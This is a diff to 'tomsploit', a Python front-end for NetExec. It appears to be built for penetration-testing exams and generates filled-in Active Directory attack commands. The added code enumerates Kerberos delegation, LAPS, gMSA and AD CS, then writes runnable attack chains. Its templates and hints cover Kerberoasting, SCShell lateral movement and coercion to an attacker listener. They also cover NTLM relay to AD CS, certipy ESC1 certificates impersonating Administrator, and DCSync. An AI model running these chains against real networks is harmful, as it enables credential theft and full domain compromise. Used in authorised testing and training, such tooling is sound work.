@@ -10,15 +10,31 @@ does not exploit, dump, or loot — it generates the commands for you to run.
 Think of it as a careful nxc front-end with a context-aware command
 generator, not a one-shot credential-attack-and-loot engine.
 
+When a credential works on a domain controller, a read-only enrichment pass
+runs a handful of extra LDAP queries (Kerberos delegation, LAPS/gMSA/ADCS,
+MachineAccountQuota, a kerberoastable sweep) and turns the results into a
+per-account Kerberos-delegation walkthrough written to
+tomsploit-delegation-<ip>-<user>.txt: each abusable delegation is laid out
+as GET / REQUIRED / MISSING / WHY with a runnable command chain, values
+already filled in from the scan. This is still enumeration — every query
+reads the directory, nothing is modified. Disable with --no-enrich; the same
+delegation engine is available offline via --deleg-in.
+
 Architecture (single file on purpose — easy to scp onto a box mid-exam):
 
     Config           CLI args -> one settings object
-    Models           AuthType, Cred, Success, TargetResult
-    Parsing          nxc stdout -> structured data
+    Models           AuthType, Cred, Success, TargetResult, DelegRow
+    Parsing          nxc stdout -> structured data (scan + enrichment queries)
     Suggestions      data-driven table: (auth, proto, dc) -> commands
+    Delegation       findDelegation + enrichment -> per-account attack routes
     Reporter         everything that prints to the terminal
-    TomSploit        scanning, subprocess control, progress, live output
+    TomSploit        scanning, subprocess control, enrichment, progress
     CLI              parse_args / build_config / main
+
+Every value that reaches the generated file from Active Directory (account
+names, SPNs, ACL trustees) is sanitised, and the file is paste-safe: dropped
+into a shell it runs only the fully-resolved commands, leaving anything with
+an unfilled <placeholder> commented out.
 """
 # MIT License — see LICENSE block at end of file.
 
@@ -123,7 +139,12 @@ class Config:
     domain: str = ""                        # -d: explicit AD domain for nxc
     force: bool = False                     # bypass the spawn-budget guard
     max_attempts: int = DEFAULT_MAX_ATTEMPTS
-    sh_only: bool = False                   # --sh: paste-ready commands only
+    sh_only: bool = False
+    no_enrich: bool = False
+    deleg_inline: bool = False
+    notes: bool = False
+    bare: bool = False
+    deleg_out: str = ""                   # --sh: paste-ready commands only
 
 
 @dataclass(frozen=True)
@@ -204,6 +225,17 @@ class TargetResult:
     lockout_threshold: int | None = None   # None=unknown, 0=disabled, N=threshold
     lockout_window: str = ""               # e.g. "30 minutes" (reset window)
     lockout_checked: bool = False
+    # Post-scan LDAP enrichment (see TomSploit._enrich_dc). Populated only for
+    # a DC where an LDAP credential worked. These turn always-on suggestion
+    # blocks into ones gated on what the domain actually has.
+    enriched: bool = False
+    deleg_rows: list = field(default_factory=list)      # list[DelegRow]
+    laps_hits: list[str] = field(default_factory=list)
+    maq: int | None = None                       # ms-DS-MachineAccountQuota
+    roastable_sweep: list[str] = field(default_factory=list)   # domain-wide SPNs
+    gmsa_hits: list[str] = field(default_factory=list)
+    adcs_hits: list[str] = field(default_factory=list)
+    enrich_notes: list[str] = field(default_factory=list)
 
 
 def tasks_per_target(cfg: Config) -> int:
@@ -592,6 +624,10 @@ SUGGEST_RULES: list[SuggestRule] = [
 
     # ── PASSWORD · LDAP ─────────────────────────────────────────────
     SuggestRule(AuthType.PASSWORD, "ldap", dc=True, commands=(
+        ("clock skew — do this FIRST, it breaks every Kerberos step below",
+            "sudo ntpdate {ip} 2>/dev/null || sudo rdate -n {ip}\n"
+            "# KRB_AP_ERR_SKEW is the #1 cause of 'my ticket doesn't work'.\n"
+            "# If you can't change system time:  faketime \"$(date -d @$(( $(date +%s) )) )\" <cmd>"),
         ("Kerberoast — SPN tickets (from Kali)",
             "impacket-GetUserSPNs -request -dc-ip {qip} "
             "{qdom}/{quser}:{qpw} -outputfile kerb.hash\n"
@@ -614,7 +650,7 @@ SUGGEST_RULES: list[SuggestRule] = [
         ("attack-path checks",
             "nxc ldap {qip} -u {quser} -p {qpw} --password-not-required\n"
             "nxc ldap {qip} -u {quser} -p {qpw} --admin-count\n"
-            "# (delegation enumeration is in the delegation block below)"),
+            "# (delegation runs automatically; --no-enrich to skip)"),
         ("offline AD dump (no BloodHound)",
             "ldapdomaindump -u {ldap_user} -p {qpw} {qip}"),
         ("enumerate more usernames (kerbrute)",
@@ -705,7 +741,7 @@ SUGGEST_RULES: list[SuggestRule] = [
     # than fired as a separate suggestion on every unflagged host.
     SuggestRule(AuthType.PASSWORD, "smb", admin=True, commands=(
         ("lateral movement via SCShell — use when psexec/smbexec fail",
-            "python3 SCShell.py {url_pw} -service-name ssh-agent\n"
+            "python3 scshell.py {url_pw} -service-name ssh-agent\n"
             "# if ssh-agent is absent, confirm a present service first:\n"
             "sc.exe query state= all | findstr SERVICE_NAME   # (in any shell you land)\n"
             "# swap -service-name to one of: defragsvc seclogon SensorDataService SessionEnv\n"
@@ -716,7 +752,7 @@ SUGGEST_RULES: list[SuggestRule] = [
     )),
     SuggestRule(AuthType.HASH, "smb", admin=True, commands=(
         ("lateral movement via SCShell [PtH] — use when psexec/smbexec fail",
-            "python3 SCShell.py {url_nopw} -hashes :{nthash} -service-name ssh-agent\n"
+            "python3 scshell.py {url_nopw} -hashes :{nthash} -service-name ssh-agent\n"
             "# if ssh-agent is absent, confirm a present service first:\n"
             "sc.exe query state= all | findstr SERVICE_NAME   # (in any shell you land)\n"
             "# swap -service-name to one of: defragsvc seclogon SensorDataService SessionEnv\n"
@@ -727,7 +763,7 @@ SUGGEST_RULES: list[SuggestRule] = [
     )),
     SuggestRule(AuthType.KERBEROS, "smb", admin=True, commands=(
         ("lateral movement via SCShell -k — use when psexec fails",
-            "python3 SCShell.py -k -no-pass {url_nopw} -service-name ssh-agent\n"
+            "python3 scshell.py -k -no-pass {url_nopw} -service-name ssh-agent\n"
             "# if ssh-agent is absent, confirm a present service first:\n"
             "sc.exe query state= all | findstr SERVICE_NAME\n"
             "# swap -service-name to: defragsvc seclogon SensorDataService SessionEnv"),
@@ -810,7 +846,7 @@ SUGGEST_RULES: list[SuggestRule] = [
         ("attack-path checks [PtH]",
             "nxc ldap {qip} -u {quser} -H {qhash} --password-not-required\n"
             "nxc ldap {qip} -u {quser} -H {qhash} --admin-count\n"
-            "# (delegation enumeration is in the delegation block below)"),
+            "# (delegation runs automatically; --no-enrich to skip)"),
     )),
     SuggestRule(AuthType.HASH, "ldap", dc=False, commands=(
         ("request a TGT (then use with -k)",
@@ -833,14 +869,15 @@ SUGGEST_RULES: list[SuggestRule] = [
     SuggestRule(AuthType.KERBEROS, "ldap", dc=True, commands=(
         ("Kerberoast -k",
             "impacket-GetUserSPNs -k -no-pass -dc-ip {qip} {qdom}/ "
-            "-outputfile kerb.hash\n"
+            "-request -outputfile kerb.hash\n"
             "# crack:  hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt"),
         ("Kerberoast / AS-REP on the target (Rubeus, uses current ticket)",
             "Rubeus.exe kerberoast /nowrap /outfile:kerb.hash\n"
             "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep.hash"),
         ("BloodHound -k",
-            "bloodhound-python -u {quser} -k --no-pass -d {qdom} "
-            "-dc {fqdn} -ns {qip} -c All --zip"),
+            "bloodhound-python -u {quser} -k -no-pass -d {qdom} "
+            "-dc {fqdn} -ns {qip} -c All --zip\n"
+            "# note: -no-pass is SINGLE-dash in BloodHound.py (--no-pass errors)"),
         ("BloodHound fallback (nxc collector) -k",
             "nxc ldap {qip} -u {quser} -k --bloodhound -c All "
             "--dns-server {qip}"),
@@ -911,48 +948,32 @@ SUGGEST_RULES: list[SuggestRule] = [
 
     # ── LDAP/DC: delegation, coercion, trusts, LAPS, ADCS ───────────
     SuggestRule(AuthType.PASSWORD, "ldap", dc=True, commands=(
-        ("delegation — find every abusable account first",
+        ("delegation — enumerate (run under --no-enrich; otherwise automatic)",
             "nxc ldap {qip} -u {quser} -p {qpw} --find-delegation\n"
             "impacket-findDelegation {qdom}/{quser}:{qpw} -dc-ip {qip}\n"
-            "# read the TYPE column: it decides which of the next three you use"),
-        ("unconstrained delegation — capture a DC TGT via coercion",
-            "# if findDelegation shows a host you control as Unconstrained:\n"
-            "# 1. start the catcher on Kali:\n"
-            "#    impacket-krbrelayx -t {dom_plain} --hashes :<host-nthash>   # (dumps TGTs)\n"
-            "# 2. coerce the DC to auth to that host (see the coercion recipe below)\n"
-            "# 3. resubmit the captured DC$ TGT:\n"
-            "#    export KRB5CCNAME=DC01\\$@{dom_plain}.ccache\n"
-            "#    impacket-secretsdump -k -no-pass <dc.fqdn> -just-dc"),
-        ("constrained delegation — impersonate via S4U (protocol transition)",
-            "# findDelegation shows msDS-AllowedToDelegateTo on the account:\n"
-            "impacket-getST -spn <cifs/target.fqdn> -impersonate administrator \\\n"
-            "  {qdom}/<DELEG-ACCOUNT>:<PASSWORD> -dc-ip {qip}\n"
-            "# SPN is not checked in the ticket — swap service with -altservice\n"
-            "# (e.g. -altservice host/target.fqdn or ldap/dc.fqdn for DCSync):\n"
-            "export KRB5CCNAME=administrator@<spn>.ccache\n"
-            "impacket-psexec -k -no-pass {dom_plain}/administrator@<target.fqdn>"),
-        ("RBCD — when you have GenericWrite/GenericAll over a computer",
-            "# needs write on the target's msDS-AllowedToActOnBehalfOfOtherIdentity\n"
-            "# (BloodHound flags this as the edge). MAQ must be >0 for addcomputer:\n"
-            "impacket-addcomputer {qdom}/{quser}:{qpw} -dc-ip {qip} \\\n"
-            "  -computer-name 'TOMPC$' -computer-pass 'Passw0rd!'\n"
-            "impacket-rbcd -delegate-to '<TARGET$>' -delegate-from 'TOMPC$' \\\n"
-            "  -action write {qdom}/{quser}:{qpw} -dc-ip {qip}\n"
-            "impacket-getST -spn cifs/<target.fqdn> -impersonate administrator \\\n"
-            "  {qdom}/'TOMPC$':'Passw0rd!' -dc-ip {qip}"),
+            "# pipe either back for the matched branch:\n"
+            "#   ... --find-delegation | {tomsploit} --deleg-in - -t {qip} -d {qdom} -u {quser} -p {qpw}"),
         ("coercion — force a target to authenticate (relay / unconstrained trigger)",
             "# check which methods bite (LISTENER defaults to localhost = safe probe):\n"
             "nxc smb {qip} -u {quser} -p {qpw} -M coerce_plus\n"
             "# then fire at your listener (relay catcher or krbrelayx):\n"
             "nxc smb {qip} -u {quser} -p {qpw} -M coerce_plus -o LISTENER=$LHOST\n"
+            "# NOTE an IP listener forces NTLM. For the UNCONSTRAINED TGT-capture\n"
+            "# chain the coerced host must address you by a NAME with a\n"
+            "# resolvable SPN, or no Kerberos AP-REQ (and no TGT) ever arrives:\n"
+            "#   python3 dnstool.py -u '{dom_plain}\\{quser}' -p {qpw} \\\n"
+            "#     -r <fakename>.{dom_plain} -d $LHOST -a add {ip}\n"
+            "#   nxc smb {qip} -u {quser} -p {qpw} -M coerce_plus -o LISTENER=<fakename>.{dom_plain}\n"
             "# relay elsewhere (SMB signing off) or to AD CS HTTP (ESC8):\n"
             "# impacket-ntlmrelayx -t smb://<victim> -smb2support\n"
             "# impacket-ntlmrelayx -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController"),
         ("domain / forest trusts",
             "nxc ldap {qip} -u {quser} -p {qpw} --dc-list\n"
             "impacket-lookupsid {url_pw} 0\n"
-            "# ^ --dc-list enumerates trusts; lookupsid gives the domain SID you\n"
-            "#   need for a cross-domain golden/forged ticket"),
+            "# --dc-list lists DCs AND enumerates trustedDomain objects with\n"
+            "# direction/type/attributes (the -M enum_trusts module is a removed\n"
+            "# stub that just points here). lookupsid gives the domain SID a\n"
+            "# cross-domain forged ticket needs."),
         ("LAPS / gMSA passwords (if this account can read them)",
             "nxc ldap {qip} -u {quser} -p {qpw} -M laps\n"
             "nxc ldap {qip} -u {quser} -p {qpw} --gmsa"),
@@ -962,33 +983,26 @@ SUGGEST_RULES: list[SuggestRule] = [
             "-vulnerable -stdout\n"
             "# ESC1 (template allows SAN): request as Administrator, then PKINIT:\n"
             "certipy req -u {quser}@{dom_plain} -p {qpw} -dc-ip {ip} \\\n"
-            "  -ca <CA-NAME> -template <TEMPLATE> -upn administrator@{dom_plain}\n"
+            "  -ca <CA-NAME> -template <TEMPLATE> -upn administrator@{dom_plain} \\\n"
+            "  -sid <DOMAIN-SID>-500\n"
+            "# ^ -sid is REQUIRED on anything patched for KB5014754 (strong\n"
+            "#   certificate mapping); the domain SID comes from the lookupsid\n"
+            "#   line in the trusts block above.\n"
             "certipy auth -pfx administrator.pfx -dc-ip {ip}\n"
             "# ^ returns the NT hash (UnPAC-the-hash) + a usable TGT"),
     )),
     SuggestRule(AuthType.HASH, "ldap", dc=True, commands=(
-        ("delegation — find every abusable account first [PtH]",
+        ("delegation — enumerate (automatic unless --no-enrich) [PtH]",
             "nxc ldap {qip} -u {quser} -H {qhash} --find-delegation\n"
-            "impacket-findDelegation {qdom}/{quser} -hashes :{nthash} -dc-ip {qip}"),
-        ("constrained delegation — impersonate via S4U [PtH]",
-            "impacket-getST -spn <cifs/target.fqdn> -impersonate administrator \\\n"
-            "  {qdom}/<DELEG-ACCOUNT> -hashes :<deleg-nthash> -dc-ip {qip}\n"
-            "# swap service freely with -altservice (SPN isn't checked)\n"
-            "export KRB5CCNAME=administrator@<spn>.ccache\n"
-            "impacket-psexec -k -no-pass {dom_plain}/administrator@<target.fqdn>"),
-        ("RBCD [PtH]",
-            "impacket-addcomputer {qdom}/{quser} -hashes :{nthash} -dc-ip {qip} \\\n"
-            "  -computer-name 'TOMPC$' -computer-pass 'Passw0rd!'\n"
-            "impacket-rbcd -delegate-to '<TARGET$>' -delegate-from 'TOMPC$' \\\n"
-            "  -action write {qdom}/{quser} -hashes :{nthash} -dc-ip {qip}\n"
-            "impacket-getST -spn cifs/<target.fqdn> -impersonate administrator \\\n"
-            "  {qdom}/'TOMPC$':'Passw0rd!' -dc-ip {qip}"),
+            "impacket-findDelegation {qdom}/{quser} -hashes :{nthash} -dc-ip {qip}\n"
+            "#   ... | {tomsploit} --deleg-in - -t {qip} -d {qdom} -u {quser} -H {qhash}"),
         ("coercion — force auth for relay / unconstrained [PtH]",
             "nxc smb {qip} -u {quser} -H {qhash} -M coerce_plus\n"
             "nxc smb {qip} -u {quser} -H {qhash} -M coerce_plus -o LISTENER=$LHOST"),
         ("domain / forest trusts [PtH]",
             "nxc ldap {qip} -u {quser} -H {qhash} --dc-list\n"
-            "impacket-lookupsid {url_nopw} -hashes :{nthash} 0"),
+            "impacket-lookupsid {url_nopw} -hashes :{nthash} 0\n"
+            "# --dc-list covers DCs + trusts in current NetExec"),
         ("LAPS / gMSA passwords [PtH]",
             "nxc ldap {qip} -u {quser} -H {qhash} -M laps\n"
             "nxc ldap {qip} -u {quser} -H {qhash} --gmsa"),
@@ -997,7 +1011,9 @@ SUGGEST_RULES: list[SuggestRule] = [
             "certipy find -u {quser}@{dom_plain} -hashes :{nthash} -dc-ip {ip} "
             "-vulnerable -stdout\n"
             "certipy req -u {quser}@{dom_plain} -hashes :{nthash} -dc-ip {ip} \\\n"
-            "  -ca <CA-NAME> -template <TEMPLATE> -upn administrator@{dom_plain}\n"
+            "  -ca <CA-NAME> -template <TEMPLATE> -upn administrator@{dom_plain} \\\n"
+            "  -sid <DOMAIN-SID>-500\n"
+            "# ^ -sid required post-KB5014754 (strong certificate mapping)\n"
             "certipy auth -pfx administrator.pfx -dc-ip {ip}"),
     )),
 
@@ -1079,7 +1095,33 @@ def build_context(s: Success, ip: str, hostname: str, is_dc: bool,
         # whichever is actually on PATH so a pasted command doesn't die with
         # "command not found" at the worst possible moment.
         "rdp_bin": rdp_binary(),
+        # How to re-invoke this script for --deleg-in. Uses the path actually
+        # used to start it, so a symlink on PATH, ./tomsploit.py and
+        # `python3 tomsploit.py` all produce a command that really runs.
+        "tomsploit": tomsploit_invocation(),
     }
+
+
+def tomsploit_invocation() -> str:
+    """The command that re-runs this script. argv[0] as given if it is on
+    PATH or executable, else an explicit `python3 <path>` so the emitted
+    pipe-back line is copy-pasteable rather than aspirational."""
+    global _SELF_CMD
+    if _SELF_CMD is None:
+        argv0 = sys.argv[0] or "tomsploit"
+        base = os.path.basename(argv0)
+        if shutil.which(base):
+            _SELF_CMD = base
+        elif os.path.isfile(argv0) and os.access(argv0, os.X_OK):
+            _SELF_CMD = argv0 if os.path.sep in argv0 else f"./{argv0}"
+        elif os.path.isfile(argv0):
+            _SELF_CMD = f"python3 {shlex.quote(argv0)}"
+        else:
+            _SELF_CMD = "tomsploit"
+    return _SELF_CMD
+
+
+_SELF_CMD: str | None = None
 
 
 def rdp_binary() -> str:
@@ -1107,10 +1149,342 @@ def _inject_local_auth(cmd: str) -> str:
     return "\n".join(lines)
 
 
+# ─── Outcome hints ──────────────────────────────────────────────────────
+# One line per command, keyed by its label. These deliberately do NOT
+# describe the command — the invocation already does that, and a line that
+# restates the binary name is pure height. They say what a HIT looks like
+# and where it leads, which is the part you cannot read off the command.
+#
+# A command with nothing useful to say gets no entry and prints bare. That
+# is the point: padding every line to be consistent is how the output got
+# loud in the first place.
+#
+# Keys must match SUGGEST_RULES labels exactly; _check_hint_labels() is
+# asserted in the test path so a renamed label cannot silently orphan a hint.
+
+_HINTS: dict[str, str] = {
+    # ── SMB ──
+    "list shares + perms":
+        "WRITE anywhere → plant .scf/.url for NetNTLM; READ on SYSVOL → chase GPP",
+    "spider shares + download readable files":
+        "grep the loot for 'password', .kdbx, .ps1, web.config, unattend.xml",
+    "enumerate users via SAMR (RID brute)":
+        "this is your users.txt for spraying, roasting and kerbrute",
+    "password policy (avoid lockout)":
+        "read the threshold BEFORE any spray; 0 = no lockout, spray freely",
+    "GPP cpasswords in SYSVOL":
+        "a cpassword is AES-decryptable with a public key = instant local admin",
+    "DCSync the domain":
+        "needs DA or DS-Replication rights; krbtgt hash = golden tickets",
+    "dump SAM + LSA + cached creds (needs local admin)":
+        "LSA secrets often hold a service account password in cleartext",
+    "SYSTEM shell (needs local admin)":
+        "drops a service binary — noisy; wmiexec/smbexec are quieter",
+    "exec fallbacks (if psexec fails)":
+        "wmiexec needs 135+445, smbexec needs 445 only",
+    "AV / EDR present on the host (read this BEFORE delivering anything)":
+        "decides whether TomCrypt output needs AMSI/AppLocker handling at all",
+    "browse SYSVOL / scripts":
+        "logon scripts leak mapped drives, service accounts and hardcoded creds",
+
+    # ── LDAP / DC ──
+    "clock skew — do this FIRST, it breaks every Kerberos step below":
+        "KRB_AP_ERR_SKEW is why a valid ticket 'doesn't work'",
+    "Kerberoast — SPN tickets (from Kali)":
+        "crack -m 13100; service accounts are reused as local admin constantly",
+    "AS-REP roast — preauth-disabled users (from Kali)":
+        "crack -m 18200; works with no creds at all if you have usernames",
+    "BloodHound (primary collector)":
+        "run Shortest Path to Domain Admins, then mark everything you own",
+    "attack-path checks":
+        "password-not-required = free auth; adminCount=1 = privileged, roast it",
+    "offline AD dump (no BloodHound)":
+        "grep the users HTML for passwords in description fields",
+    "enumerate more usernames (kerbrute)":
+        "AS-REQ probing does not count toward lockout",
+    "coercion — force a target to authenticate (relay / unconstrained trigger)":
+        "any method that bites = a relay target or an unconstrained TGT capture",
+    "domain / forest trusts":
+        "Inbound/Bidirectional trust = a path INTO the other domain",
+    "LAPS / gMSA passwords (if this account can read them)":
+        "LAPS gives local admin on that one host; gMSA is often a service identity",
+    "AD CS — find vulnerable templates, then request as a target":
+        "ESC1 = any template with SAN + client auth = DA cert",
+    "delegation — enumerate (run under --no-enrich; otherwise automatic)":
+        "an SPN pointing at the DC is domain compromise, not a lateral move",
+
+    # ── other protocols ──
+    "interactive shell":
+        "needs Remote Management Users membership, not just valid creds",
+    "semi-interactive shell":
+        "no service created, so quieter than psexec",
+    "RDP session (+ share mount for transfers)":
+        "/drive: gives you file transfer without touching SMB",
+    "screenshot the desktop":
+        "shows a logged-in session without authenticating interactively",
+    "SQL privileges + impersonable logins":
+        "an impersonable sysadmin login = xp_cmdshell as SYSTEM",
+    "linked servers — enumerate the chain":
+        "links execute as a DIFFERENT login, often sa on another host",
+    "capture NetNTLM via xp_dirtree (start responder first)":
+        "gives you the SQL service account hash — crack or relay it",
+    "shell (no host-key prompts)":
+        "check sudo -l and id first; GTFOBins the rest",
+
+    # ── after DCSync ──
+    "child → parent escalation (after you have krbtgt)":
+        "SID history is not filtered within a forest — this is the forest win",
+
+    # ── previously uncovered (parity pass) ──
+    "interactive share browse":
+        "manual poke when spider_plus is overkill — one share, eyes on",
+    "full SMB/RPC enum":
+        "users, groups, shares, password policy in one shot",
+    "AS-REP roast — on the target (Rubeus)":
+        "when you have a Windows foothold but no route out to Kali",
+    "Kerberoast — on the target if impacket fails (Rubeus)":
+        "same tickets, collected host-side — crack -m 13100 back on Kali",
+    "BloodHound fallback (nxc collector)":
+        "use when bloodhound-python can't reach the DC; same graph data",
+    "SQL client":
+        "impersonable sysadmin login = xp_cmdshell as SYSTEM",
+    "xp_cmdshell (in the mssqlclient prompt)":
+        "enable + run OS commands as the SQL service account",
+    "OS command via nxc":
+        "one-shot command without holding the SQL prompt open",
+    "linked servers — enumerate the chain":
+        "links execute as a DIFFERENT login, often sa on another host",
+    "execute down a linked server (needs RPC Out on the link)":
+        "pivots SQL exec to the linked host — check RPC Out is enabled",
+    "same thing via nxc modules (no SQL prompt needed)":
+        "mssql_priv / link enumeration without dropping into a prompt",
+    "confirm exec without a full shell":
+        "proves the creds run commands before you commit to a shell",
+    "quick command exec":
+        "one command, no session — quiet reconnaissance",
+    "after login — quick local enum":
+        "sudo -l, id, SUID — the first three things on any *nix box",
+    "offline directory dump":
+        "grep the users HTML for passwords in description fields",
+    "shell via the ticket cache (GSSAPI)":
+        "reuse an existing ccache — no password/hash needed",
+    "recursive pull":
+        "mirror a whole share locally, then grep the loot at leisure",
+    "connect":
+        "interactive session on the share",
+    "list exports":
+        "NFS shares often world-readable — check for home dirs and keys",
+    "mount an export":
+        "no_root_squash = write a SUID binary as root for local privesc",
+    "_scshell":
+        "patches a service binary in place — no new service, quieter",
+    "request a TGT (then use with -k)":
+        "gets a ccache you reuse across impacket tools with -k -no-pass",
+}
+
+
+# PtH rules label the SAME command slightly differently ("... [PtH]", and a
+# few are shortened). A hint describes what the COMMAND does, which is
+# identical either way, so hints are looked up on a NORMALISED label rather
+# than duplicated per auth type. _norm_label folds both forms to one key.
+import re as _re_hints
+_PTH_SUFFIX = _re_hints.compile(r"\s*\[PtH[^\]]*\]\s*$")
+# -k (kerberos ccache) and -r (kcache) auth variants suffix the label the same
+# way [PtH] does; fold them too so one hint covers all auth forms of a command.
+_KAUTH_SUFFIX = _re_hints.compile(r"\s+-[kr]\s*$")
+
+# Wording that differs between the password and PtH label for the same command.
+# Map the SHORTER/variant form onto the canonical (password) label text.
+_LABEL_ALIASES = {
+    "enumerate users via SAMR": "enumerate users via SAMR (RID brute)",
+    "dump SAM + LSA (needs local admin)":
+        "dump SAM + LSA + cached creds (needs local admin)",
+    "dump SAM + LSA": "dump SAM + LSA + cached creds (needs local admin)",
+    "SYSTEM shell": "SYSTEM shell (needs local admin)",
+    "exec fallbacks": "exec fallbacks (if psexec fails)",
+    "AV / EDR present on the host":
+        "AV / EDR present on the host (read this BEFORE delivering anything)",
+    "Kerberoast": "Kerberoast — SPN tickets (from Kali)",
+    "Kerberoast [from Kali]": "Kerberoast — SPN tickets (from Kali)",
+    "AS-REP roast": "AS-REP roast — preauth-disabled users (from Kali)",
+    "AS-REP roast [from Kali]": "AS-REP roast — preauth-disabled users (from Kali)",
+    "BloodHound": "BloodHound (primary collector)",
+    "RDP session": "RDP session (+ share mount for transfers)",
+    "SQL privileges + linked servers": "SQL privileges + impersonable logins",
+    # these two PtH labels shorten the password label; map to the real text
+    "SQL client": "SQL client",
+    "OS command via nxc": "OS command via nxc",
+    # Kerberos-auth Rubeus variant folds onto the on-target roast hint
+    "Kerberoast / AS-REP on the target if impacket fails (Rubeus)":
+        "Kerberoast — on the target if impacket fails (Rubeus)",
+    "Kerberoast / AS-REP on the target (Rubeus, uses current ticket)":
+        "Kerberoast — on the target if impacket fails (Rubeus)",
+    "Kerberoast": "Kerberoast — SPN tickets (from Kali)",
+    "interactive shell": "shell (no host-key prompts)",
+    "interactive (active mode)": "shell (no host-key prompts)",
+    "lateral movement via SCShell — use when psexec/smbexec fail":
+        "_scshell",
+    "lateral movement via SCShell [PtH] — use when psexec/smbexec fail":
+        "_scshell",
+    "lateral movement via SCShell -k — use when psexec fails":
+        "_scshell",
+}
+
+
+def _norm_label(label: str) -> str:
+    """Canonical hint key for a label: drop the [PtH...] / -k / -r auth suffix,
+    then fold any known wording variant onto its password-label equivalent."""
+    base = _PTH_SUFFIX.sub("", label)
+    base = _KAUTH_SUFFIX.sub("", base).strip()
+    return _LABEL_ALIASES.get(base, base)
+
+
+def _hint_for(label: str) -> str:
+    return _HINTS.get(label, "") or _HINTS.get(_norm_label(label), "")
+
+
+def _check_hint_labels() -> list[str]:
+    """Hint keys that no longer match any SUGGEST_RULES label (i.e. orphaned
+    by a rename). Asserted in tests so drift is caught, not silently ignored."""
+    labels = {_norm_label(l) for r in SUGGEST_RULES for l, *_ in r.commands}
+    labels |= {l for r in SUGGEST_RULES for l, *_ in r.commands}
+    return [k for k in _HINTS if k not in labels]
+
+
+def _labels_without_hints() -> list[str]:
+    """The REVERSE check: emitted command labels that resolve NO hint. This is
+    the gap that let PtH output lose all its hints silently — every hint key
+    matched a password label, but the parallel PtH labels matched nothing and
+    _check_hint_labels only looked one way. Asserted in tests so a new command
+    (or a new [PtH] variant) can't ship hintless without being noticed.
+
+    Only 'real' suggestion commands count — the delegation blocks carry their
+    own GET/REQUIRED/MISSING structure instead of a one-line hint, and a few
+    labels are intentionally hint-free, listed below."""
+    intentionally_bare = {
+        # These carry their own GET/REQUIRED/MISSING structure (delegation) or
+        # are gated enrichment blocks — a one-line hint would be redundant.
+        "delegation — enumerate (automatic unless --no-enrich)",
+        "delegation — enumerate (automatic unless --no-enrich) [PtH]",
+        "coercion — force a target to authenticate (relay / unconstrained trigger)",
+        "coercion — force auth for relay / unconstrained [PtH]",
+        "LAPS / gMSA passwords (if this account can read them)",
+        "LAPS / gMSA passwords [PtH]",
+        "AD CS — find vulnerable templates, then request as a target",
+        "AD CS — find vulnerable templates [PtH]",
+    }
+    intentionally_bare = {_norm_label(x) for x in intentionally_bare} | intentionally_bare
+    missing = []
+    seen = set()
+    for r in SUGGEST_RULES:
+        for entry in r.commands:
+            label = entry[0]
+            if label in seen:
+                continue
+            seen.add(label)
+            if label in intentionally_bare:
+                continue
+            if not _hint_for(label):
+                missing.append(label)
+    return missing
+
+
+
+def _deleg_ctx_from(ctx: dict, s: "Success", ip: str, hostname: str,
+                    maq: "int | None" = None) -> dict:
+    """Delegation-emitter context derived from a built suggestion context.
+    Shared by build_suggestions and the Reporter so the terminal summary and
+    the written file can never disagree about what they are describing."""
+    dom_p = ctx["dom_plain"]
+    return {
+        "dom_plain": dom_p,
+        "ip": ip,
+        "deleg_user": s.user,
+        "cred_flag": (f"-hashes :{ctx['nthash']}" if s.is_hash
+                      else f"-p {ctx['qpw']}"),
+        # Raw secret + kind, for tools that take the credential differently
+        # from impacket (bare positional, user:pass string, -hashes vs -p).
+        "cred_secret": (ctx["nthash"] if s.is_hash else s.secret),
+        "cred_is_hash": s.is_hash,
+        # DC identity: lets the emitters spot a delegation SPN that points AT
+        # the DC, which is domain compromise rather than a lateral move.
+        "dc_short": hostname or "",
+        "dc_fqdn": (f"{hostname}.{dom_p}"
+                    if hostname and dom_p != "<DOMAIN>" else ""),
+        "maq": maq,          # ms-DS-MachineAccountQuota (None = unknown)
+        "roastable_sweep": [],   # filled in at the call sites below
+    }
+
+
+# Labels of blocks that are GATED on enrichment: emitted only when the
+# enrichment pass actually found something for them. Matching is by label
+# prefix so the PtH variants ("... [PtH]") are covered by the same entry.
+_GATED_LABELS: dict[str, str] = {
+    "LAPS / gMSA passwords": "laps_gmsa",
+    "LAPS / gMSA passwords [PtH]": "laps_gmsa",
+    "AD CS — find vulnerable templates": "adcs",
+    "AD CS — find vulnerable templates [PtH]": "adcs",
+    # covers both the password and [PtH] variants by prefix
+    "delegation — enumerate": "delegation",
+}
+
+
+def _gate_key(label: str) -> str | None:
+    for prefix, key in _GATED_LABELS.items():
+        if label.startswith(prefix):
+            return key
+    return None
+
+
+def _strip_notes(cmd: str) -> str:
+    """Remove explanatory prose, keep runnable commands.
+
+    Operates on LOGICAL commands (following backslash continuations) rather
+    than physical lines: dropping a comment that sits between a command and
+    its continuation would splice the two together. A group whose FIRST line
+    is a comment is prose (or a commented-out alternative) and goes; anything
+    else is a command and stays, continuations and all.
+
+    Note this also drops commented-out alternatives. That is deliberate: they
+    carry <PLACEHOLDER> values and are therefore not the next command, which
+    is exactly the noise this mode exists to remove. --notes brings them back."""
+    lines = cmd.split("\n")
+    out: list[str] = []
+    i = 0
+    while i < len(lines):
+        line = lines[i].rstrip()
+        stripped = line.lstrip()
+        if not stripped:
+            i += 1
+            continue
+        group = [line]
+        while group[-1].endswith("\\") and i + 1 < len(lines):
+            i += 1
+            group.append(lines[i].rstrip())
+        if not stripped.startswith("#"):
+            out.extend(group)
+        i += 1
+    return "\n".join(out)
+
+
 def build_suggestions(s: Success, ip: str, hostname: str,
-                      is_dc: bool, domain_fallback: str = ""
+                      is_dc: bool, domain_fallback: str = "",
+                      enrich: "TargetResult | None" = None,
+                      deleg_inline: bool = True,
+                      notes: bool = False
                       ) -> list[tuple[str, str]]:
-    """Return [(label, command), ...] follow-ups for a success.
+    """Return [(label, command, hint), ...] follow-ups for a success.
+
+    Each entry is a 3-tuple: the block label, the command text, and a one-line
+    outcome hint ("" when the command has none). Hints are looked up on a
+    normalised label so a password and its PtH variant share one hint.
+
+    With `enrich` (a TargetResult carrying a completed enrichment pass), the
+    delegation block is REPLACED by the routes that actually apply (or, unless
+    deleg_inline, summarised and written to a file), and the LAPS/gMSA/ADCS
+    blocks are dropped when the domain had nothing for them. Without it,
+    behaviour is unchanged — every block prints, as before. `notes` keeps the
+    explanatory comments; `bare` strips everything but the commands.
 
